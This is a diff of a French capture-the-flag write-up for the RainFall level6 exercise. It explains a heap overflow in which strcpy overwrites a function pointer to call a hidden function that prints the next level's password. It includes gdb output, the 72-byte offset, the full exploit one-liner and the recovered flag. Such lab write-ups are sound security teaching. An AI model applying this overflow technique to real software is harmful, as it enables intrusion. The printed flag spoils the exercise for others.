@@ -18,13 +18,12 @@ level6@RainFall:~$ objdump -d level6
  8048466:	c9                   	leave
  8048467:	c3                   	ret
 
-La fonction <n> ici presente n'est pas appelee par notre programme, on peut
-le verifier lorsque l'on gdb celui-ci.
+La fonction <n> ici prêsente n'est pas appelée par notre programme.
 
 (gdb) x/s 0x80485b0
 0x80485b0:	 "/bin/cat /home/user/level7/.pass"
 
-Et celle-ci effectue un cat sur le fichier dont nous cherchons le condisas tenu..
+Et celle-ci effectue un cat sur le fichier .pass
 
    0x080484d0 <+84>:	call   *%eax
 
@@ -37,24 +36,23 @@ nous affiche le fameux "Nope".
 	(gdb) x 0x80485d1
 	0x80485d1:	 "Nope"
 
-Nous allons utilise la faille presente dans le programe level6, qui ne fais
-aucune verification concernant la taille des donnees recu par malloc avant
-l'appel a strcpy, ce qui va nous permettre le buffer overflow et l'appel a la
-fonction <n> plutot que l'appel a la fonction <m>.
-En effet malloc alloue dans un premier temps 64 octets pour notre stdin, puis
+Nous allons utiliser la faille présente dans le programe level6, qui ne fais
+aucune vérification concernant la taille des données reçu par malloc avant
+l'appel à strcpy, ce qui va nous permettre le buffer overflow et le remplacement
+de l'adresse de la fonction <m> par celle de <n>.
+Malloc alloue dans un premier temps 64 octets pour notre stdin, puis
 dans un second temps 4 octets pour le pointeur sur la fonction <m>.
 
 Nous recuperons l'offset qui est de 72:
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 
 72, car malloc alloue 64 octets dans un premier temps, auquel on ajoute les 8
-octets correspondant au "boundary tag" grossierement parlant l'etiquette de
+octets correspondant au "boundary tag" grossièrement parlant l'étiquette de
 notre malloc. Puis nos 4 octets pour remplacer l'adresse de notre fonction <m>
-par celle desiree. Nous n'allons plus qu'a creer notre script et lancer le tout
+par celle desirée. Nous n'avons plus qu'à créer notre script et lancer le tout
 
 
 level6@RainFall:~$ ./level6 $(python -c 'print 72*"A"+"\x54\x84\x04\x08"')
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
 Gogogogo Power Rangers..
-
